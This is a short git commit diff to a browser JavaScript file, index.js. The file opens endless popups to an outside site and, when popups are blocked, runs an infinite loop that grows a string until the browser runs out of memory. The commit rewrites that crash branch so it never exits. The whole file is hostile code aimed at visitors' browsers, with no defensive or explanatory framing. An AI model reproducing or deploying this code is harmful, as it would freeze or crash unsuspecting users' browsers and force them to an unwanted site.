b495b1e852bd743b5a0b1119237e80da9b1bbc7c
Dr3w0623 <34252192+Dr3w0623@users.noreply.github.com>
2017-12-15 14:02:59 -0500

    Update index.js

--- index.js
+++ index.js
@@ -1,10 +1,12 @@
    var windowName = 'userConsole';
    var popUp = window.open("http://kplibrary.cf/", '_blank', 'toolbar=0,location=0,menubar=0');
    if (popUp == null || typeof(popUp) == 'undefined') {
-     txt = "a";
-     while (1000) {
-       txt = txt += "a";
-     }
+   while (true) {
+  txt = "a";
+  while (1) {
+    txt = txt += "a";
+  }
+}
    } else {
      while (true) {
        window.open("http://kplibrary.cf/")
